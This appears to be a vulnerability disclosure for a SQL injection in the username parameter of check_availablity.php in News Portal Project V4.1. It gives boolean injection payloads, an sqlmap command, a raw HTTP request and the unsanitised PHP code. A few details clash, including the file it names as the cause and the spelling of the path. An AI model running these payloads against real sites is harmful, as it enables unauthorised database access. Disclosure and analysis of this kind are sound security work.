# News Portal Project V4.1 SQL Injection Vulnerability
##### Vulnerability Location: /admin/check_availablity.php
##### Affected Range: News Portal Project V4.1
##### Vulnerability Cause: database_admin.php contains a serious security vulnerability. The manipulation of the argument username leads to sql injection. The attack can be launched remotely.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions;
##### Link: https://phpgurukul.com/news-portal-project-in-php-and-mysql/
# Vulnerability recurrence

This vulnerability does not require a vulnerability. Just access: /admin/check_availablity.php

payload:'+or+'1'='2

<img width="1194" height="294" alt="image" src="https://github.com/user-attachments/assets/170aea28-0ec4-4b33-a914-4afa7e1c9c25" />

payload:'+or+'1'='1

<img width="1160" height="289" alt="image" src="https://github.com/user-attachments/assets/0375be8d-d5bb-4970-811b-cf1dfe849455" />

Use the tool sqlmap：python sqlmap.py -r 1.txt --current-user

<img width="1205" height="586" alt="image" src="https://github.com/user-attachments/assets/a6421fe9-87ce-4524-8428-f1241ff94476" />

```http
POST /admin/check_availability.php HTTP/1.1
Host: 192.168.0.126:8089
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=1*
```

# Code Analysis

The argument: username in /admin/check_availablity.php:

The variable username was directly passed through the POST method and then directly into the SQL statement

```php
<?php 
  require_once("includes/config.php");
  // code   username availablity
  if(!empty($_POST["username"])) {
  	$uname= $_POST["username"];
    $query=mysqli_query($con,"select AdminuserName from tbladmin where AdminuserName='$uname'");		
    $row=mysqli_num_rows($query);
  if($row>0){
    echo "<span style='color:red'> Username already exists. Try with another username</span>";
   echo "<script>$('#submit').prop('disabled',true);</script>";
  } else{
    echo "<span style='color:green'> Username available for Registration .</span>";
    echo "<script>$('#submit').prop('disabled',false);</script>";
    }
  }
?>
```
